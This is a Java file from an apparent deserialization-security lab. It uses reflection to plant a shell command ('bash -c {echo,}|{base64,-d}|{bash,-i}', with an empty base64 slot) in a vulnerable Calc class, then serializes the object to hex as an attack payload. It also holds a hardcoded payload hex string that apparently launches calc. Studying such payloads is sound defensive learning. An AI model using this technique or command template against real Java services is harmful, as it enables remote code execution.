package lab1;

import com.yxxx.javasec.deserialize.Calc;

import java.io.*;
import java.lang.reflect.Field;

public class SeriaCalc {
    public static void setFiled(Object obj,String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{
        Calc calc = new Calc();
        setFiled(calc, "cmd","bash -c {echo,}|{base64,-d}|{bash,-i}");
        setFiled(calc, "canPopCalc", true);

        // serialize
//        System.out.println(Utils.objectToHexString(calc));
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = null;
        out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(calc);
//        out.writeUTF("");
        out.flush();
        byte[] bytes = byteArrayOutputStream.toByteArray();
        byteArrayOutputStream.close();
        System.out.println(Utils.bytesTohexString(bytes));

        // deserialize
//        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(bytes));
//        Calc c = (Calc) objectInputStream.readObject();
        String data = "aced000573720021636f6d2e797878782e6a6176617365632e646573657269616c697a652e43616c6318e1092605b13ed80200025a000a63616e506f7043616c634c0003636d647400124c6a6176612f6c616e672f537472696e673b78700174000b636d64202f632063616c63";
//        byte[] b = Utils.hexStringToBytes(data);
//        InputStream inputStream = new ByteArrayInputStream(b);
//        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
////        System.out.println(objectInputStream.readInt());
//        System.out.println(objectInputStream.readUTF());
//        objectInputStream.readObject();
    }
}
